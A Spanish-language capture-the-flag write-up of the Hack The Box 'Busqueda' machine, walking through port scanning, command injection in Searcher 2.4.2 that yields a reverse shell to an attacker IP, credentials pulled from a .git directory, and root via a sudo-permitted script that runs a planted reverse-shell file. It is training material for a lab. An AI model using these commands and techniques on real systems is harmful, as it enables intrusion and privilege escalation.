# Hack The Box - Busqueda Writeup

## Introducción

Busqueda es una máquina de Hack The Box que se enfoca en la explotación de vulnerabilidades de permisos, escalada de privilegios y manipulación de servicios en un entorno Dockerizado. En este writeup, detallaré cada paso que tomé para comprometer la máquina, incluyendo el uso de herramientas como nmap, whatweb, y sudo, así como técnicas de escalada de privilegios a través de la ejecución remota de comandos.

---

## Paso 1: Reconocimiento

El primer paso fue realizar un escaneo con nmap para identificar puertos abiertos y servicios disponibles en la máquina. Ejecuté el siguiente comando:

nmap -p- -sV -T4 10.10.11.208 -v -v10 -sT --min-rate 50000


El resultado mostró los puertos abiertos:

- **22/tcp** - SSH
- **80/tcp** - HTTP

### Análisis de la página web

Con el servicio HTTP en ejecución, utilicé **whatweb** para obtener más información sobre la tecnología de la página:

whatweb 10.10.11.208


La respuesta indicó un redireccionamiento a `http://searcher.htb`, lo que me llevó a agregar esta entrada en el archivo `/etc/hosts`:

echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts


Al acceder a `http://searcher.htb`, encontré una página simple que ofrecía dos motores de búsqueda. Tras investigar más a fondo, identifiqué una vulnerabilidad de **inyección de comandos arbitrarios** en la aplicación Searcher 2.4.2.

---

## Paso 2: Explotación de la vulnerabilidad de Inyección de Comandos

Utilicé la siguiente prueba de concepto (PoC) para inyectar comandos arbitrarios:

./script.sh http://searcher.htb 10.10.14.3


Esto me permitió ejecutar un **reverse shell** en el servidor. Posteriormente, estabilicé la shell con:

script /dev/null -c /bin/bash export TERM=xterm


Luego, presioné `CTRL+Z`, escribí `stty raw -echo;fg` y recuperé la shell estabilizada.

---

## Paso 3: Escalada de Privilegios

Al ejecutar **linpeas**, encontré un directorio `.git` en `/var/www/app/.git`. Esto me permitió obtener credenciales para acceder a un repositorio privado de Gitea en `http://gitea.searcher.htb`.

Al revisar la configuración del repositorio, encontré las siguientes credenciales de Gitea:

- **Usuario**: `cody`
- **Contraseña**: `jh1usoih2bkjaspwe92`

Con estas credenciales, inicié sesión en Gitea y obtuve más información sobre el entorno.

---

## Paso 4: Identificación de Comandos Permitidos por Sudo

Ejecuté el siguiente comando para verificar qué comandos podía ejecutar como el usuario `svc` con privilegios de **sudo**:

sudo -l


Esto mostró que el usuario `svc` podía ejecutar el siguiente comando como root:

/usr/bin/python3 /opt/scripts/system-checkup.py *


---

## Paso 5: Análisis de la herramienta `system-checkup.py`

Al inspeccionar el script `system-checkup.py`, observé tres opciones disponibles:

- **docker-ps**: Lista los contenedores Docker en ejecución.
- **docker-inspect**: Inspecciona un contenedor Docker específico.
- **full-checkup**: Ejecuta un chequeo completo del sistema.

Ejecuté el comando **docker-ps** y vi que había contenedores Docker en ejecución, incluyendo uno de Gitea y otro de MySQL.

Para explorar el comando **docker-inspect**, utilicé el siguiente formato:

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea


El comando devolvió un JSON con detalles sobre el contenedor de Gitea, lo que me permitió ver que el contenedor estaba configurado con ciertas variables de entorno, incluyendo una contraseña para la base de datos MySQL.

---

## Paso 6: Escalada de Privilegios Final

Al revisar el script, descubrí que el comando **full-checkup** ejecutaba el script `full-checkup.sh`. Aprovechando esto, creé un reverse shell en el archivo `full-checkup.sh` y lo cargué en una ubicación de escritura dentro del contenedor Docker.

Escuché en un puerto:

nc -lvnp 4444


Finalmente, ejecuté el siguiente comando para ejecutar el chequeo completo:

sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup


Esto me dio acceso a una shell de root en el servidor.
